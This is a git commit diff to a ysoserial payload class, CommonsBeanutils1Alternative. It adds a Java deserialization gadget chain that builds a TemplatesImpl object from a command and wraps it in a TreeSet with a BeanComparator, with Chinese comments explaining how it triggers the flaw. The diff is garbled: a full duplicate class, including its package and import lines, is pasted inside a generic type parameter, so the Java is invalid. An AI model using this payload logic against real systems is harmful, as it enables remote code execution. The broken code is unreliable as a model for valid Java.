a8345dcb1aaa572a7db2a805cbc97c2b9cfcebdf
manhinyeung <38186162+manhinyeung@users.noreply.github.com>
2024-08-14 23:16:12 +0800

    Update CommonsBeanutils1Alternative.java

--- src/main/java/ysoserial/payloads/CommonsBeanutils1Alternative.java
+++ src/main/java/ysoserial/payloads/CommonsBeanutils1Alternative.java
@@ -10,7 +10,44 @@ import ysoserial.payloads.util.PayloadRunner;
 
 @Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
 @Authors({"frohoff"})
-public class CommonsBeanutils1Alternative implements ObjectPayload<Serializable> {
+public class CommonsBeanutils1Alternative implements ObjectPayload<package ysoserial.payloads;
+
+import java.io.Serializable;
+import java.util.TreeSet;
+import org.apache.commons.beanutils.BeanComparator;
+import ysoserial.payloads.annotation.Authors;
+import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.util.Gadgets;
+import ysoserial.payloads.util.PayloadRunner;
+
+@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
+@Authors({"frohoff"})
+public class CommonsBeanutils1Alternative implements ObjectPayload<Object> {
+
+    public CommonsBeanutils1Alternative(String calc) {
+    }
+
+    public static void main(String[] args) throws Exception {
+        PayloadRunner.run(CommonsBeanutils1Alternative.class, args);
+    }
+
+    @Override
+    public Serializable getObject(String command) throws Exception {
+        // 创建一个可以触发反序列化漏洞的 TemplatesImpl 对象
+        Object templates = Gadgets.createTemplatesImpl(command);
+
+        // 创建自定义的 BeanComparator，使用 TemplatesImpl 的方法作为比较依据
+        BeanComparator comparator = new BeanComparator("outputProperties");
+
+        // 使用 TreeSet 和自定义比较器
+        TreeSet<Object> treeSet = new TreeSet<>(comparator);
+        treeSet.add(templates);
+        treeSet.add(templates);
+
+        // 由于TreeSet是Serializable的，我们可以直接返回它
+        return treeSet;
+    }
+}> {
 
     public CommonsBeanutils1Alternative() {
     }
